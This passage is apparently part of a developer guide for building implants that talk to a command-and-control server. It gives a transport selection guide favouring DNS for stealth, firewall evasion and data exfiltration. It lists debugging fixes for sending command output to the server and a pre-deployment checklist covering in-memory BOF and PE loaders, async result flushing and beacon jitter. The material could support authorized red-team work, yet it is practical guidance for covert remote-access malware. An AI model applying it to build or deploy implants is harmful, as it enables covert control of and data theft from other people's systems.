| Setup Difficulty | Easy | Medium | Medium | Hard |
| Logging Visibility | High | High | Low | Medium |

**Selection Guide:**
- **TCP**: Fast internal networks, trusted environments, full C2 control
- **HTTP**: Windows systems, through proxies, rapid callback
- **HTTPS**: Professional appearance, encrypted, corporate proxies
- **DNS**: Maximum stealth, firewall evasion, data exfiltration

---

## Part 7: Common Implementation Mistakes & Debugging

### Mistake 1: Writing Session Credentials to Disk
**Default behaviour**: SessionID and UUID must be stored as global in-memory variables only. Do **not** write them to disk unless disk persistence is an explicit design requirement. When the implant process exits the session dies with it — re-registration on the next run is the correct default.

**If disk persistence is explicitly desired**, watch out for trailing newlines:

**Symptom**: `invalid UUID length: 0`, SessionID stays 0 after registration

**Root Cause**:
```
Writing with echo: echo "$sessionID" > file    # Adds \n!
Reading back: cat file = "774\n"
JSON becomes: {"SessionID":774\n}  # PARSE ERROR!
```

**Fix (disk persistence only)**:
```
Bash: printf '%s' "$sessionID" > file       # NOT echo
Python: f.write(str(sessionID))             # NOT print()
Go: fmt.Fprintf(f, "%s", sessionID)         # NO newline
Always strip trailing whitespace on read back
```

### Mistake 2: Not Escaping Newlines in Multi-line Output
**Symptom**: `invalid character '\n' in string literal`

**Root Cause**:
```
Command output with newlines:
1: lo: <LOOPBACK>
    inet 127.0.0.1

Embedded directly in JSON:
{"data":"1: lo: <LOOPBACK>
    inet 127.0.0.1"}  # PARSE ERROR!
```

**Fix**: JSON escape in correct order
```
1. Backslashes first: \ → \\
2. Then quotes: " → \"
3. Then newlines: \n (literal backslash-n)
```

### Mistake 3: Base64 Encoding Command Output
**Symptom**: Server shows base64 gibberish instead of command output

**Root Cause**: Encoding output before sending
```
WRONG:
output = base64_encode(command_output)
send_to_server(output)

RIGHT:
output = command_output  # Plain text
json_escaped = json_escape(output)  # Escape for JSON
send_to_server(json_escaped)
```

### Mistake 4: TCP Sending Without Newline
**Symptom**: No response from server, connection timeout

**Root Cause**:
```
WRONG:
socket.Send(json_string)  # No \n!
Server's ReadString('\n') waits forever

RIGHT:
socket.Send(json_string + "\n")  # Include newline
```

### Mistake 5: Wrong Field Names (Case Sensitivity)
**Symptom**: Server says "PSK missing" or doesn't register

**Root Cause**:
```
TCP expects: {"PSK":"...", "SessionID":...}  # Capitalized
HTTP expects: psk=...&sessionID=...  # Lowercase!
```

**Fix**: Use correct casing per protocol:
- TCP: `PSK`, `SessionID`, `UUID` (capitalized)
- HTTP/HTTPS: `psk`, `sessionID`, `UUID` (lowercase)
- DNS (in JSON): `psk`, `sessionID`, `UUID` (lowercase)

### Mistake 6: HTTP Not URL-Encoding Special Characters
**Symptom**: Multi-line output causes parse errors

**Root Cause**:
```
WRONG:
url = "http://server/?data=line1\nline2"

RIGHT:
encoded = url_encode("line1\nline2")  # → "line1%0Aline2"
url = "http://server/?data=" + encoded
```

### Mistake 7: DNS Chunks Not Base64
**Symptom**: DNS queries fail, malformed subdomain

**Root Cause**:
```
WRONG:
subdomain = "774-0-1-" + raw_json  # Raw JSON in subdomain!

RIGHT:
b64_json = base64_encode(json_string)
subdomain = "774-0-1-" + b64_json
```

---

## Part 8: Quick Reference Checklist

Before deploying an implant, verify:

- [ ] **Session state**: SessionID and UUID stored as global in-memory variables — no disk writes by default
- [ ] **JSON escaping**: Backslash first, then quotes, then newlines
- [ ] **Command output**: Plain text (NOT base64) in Data/data field
- [ ] **TCP**: Send with `\n`, receive without
- [ ] **HTTP/HTTPS**: URL-encode multi-line output, response is JSON
- [ ] **DNS**: Base64 chunks ~50 chars, response is also chunked base64
- [ ] **Field names**: TCP uses capitalized, HTTP/DNS use lowercase
- [ ] **Empty commands**: Check for empty string, don't execute
- [ ] **Registration**: Assign returned sessionID/UUID to in-memory globals immediately
- [ ] **bof_loader / bof_loader_async**: Last space-delimited token = base64 COFF; preceding tokens = type-prefixed BOF args; pack with PACK_BOF_ARGS
- [ ] **pe_loader**: Last space-delimited token = base64 PE binary; preceding tokens = command-line args passed to the PE
- [ ] **Async BOF results**: Flush `global_async_results` queue to C2 at the start of each check-in cycle before processing the incoming command
- [ ] **Beacon interval**: Add random jitter (0-50%)

---
